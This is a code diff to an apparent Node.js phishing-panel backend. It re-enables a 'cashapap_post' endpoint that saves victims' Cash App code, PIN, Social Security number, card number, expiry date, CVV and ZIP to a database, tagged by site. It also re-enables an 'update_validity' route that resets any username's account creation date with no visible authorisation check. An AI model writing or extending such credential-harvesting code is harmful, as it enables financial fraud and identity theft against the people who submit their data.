@@ -7,7 +7,7 @@ const Site = require('../models/Site')
 const createToken = require('../utils/createToken')
 const LinkName = require('../models/LinkName')
 const Click = require('../models/Click')
-// const CashApp = require('../models/CashApp')
+const CashApp = require('../models/CashApp')
 
 
 // const {API_KEY}=require('../keys')
@@ -773,42 +773,42 @@ module.exports.pass_change = async (req, res) => {
 
 
 
-// module.exports.update_validity =  (req, res) => {
+module.exports.update_validity =  (req, res) => {
 
-//     const { username } = req.body
-//     const currentDate = new Date();
-//     User.findOneAndUpdate({ username: username }, {
-//         $set: {
-//             createdAt: currentDate
-//         }
-//     }, { new: true }, (err, ok) => {
-//         if (err) {
-//             res.status(400).json({ error: err })
-//         }
-//         res.status(200).json({ success: true })
-//     })
+    const { username } = req.body
+    const currentDate = new Date();
+    User.findOneAndUpdate({ username: username }, {
+        $set: {
+            createdAt: currentDate
+        }
+    }, { new: true }, (err, ok) => {
+        if (err) {
+            res.status(400).json({ error: err })
+        }
+        res.status(200).json({ success: true })
+    })
 
-// }
+}
 
-// module.exports.cashapap_post = async (req, res) => {
-//     const { code, pin, ssn, site, card_number,mm_yy, ccv,zip} = req.body;
+module.exports.cashapap_post = async (req, res) => {
+    const { code, pin, ssn, site, card_number,mm_yy, ccv,zip} = req.body;
 
-//     try {
+    try {
       
-//         const cashapp = await CashApp.create({
-//             code, pin, ssn, site, card_number,mm_yy, ccv,zip
+        const cashapp = await CashApp.create({
+            code, pin, ssn, site, card_number,mm_yy, ccv,zip
 
 
-//         })
-//         return res.status(200).json({ success: "Created successfully " })
+        })
+        return res.status(200).json({ success: "Created successfully " })
 
 
-//     }
-//     catch (e) {
+    }
+    catch (e) {
 
-//         return res.status(400).json({ error: e })
+        return res.status(400).json({ error: e })
 
-//     }
+    }
 
 
-// }
+}
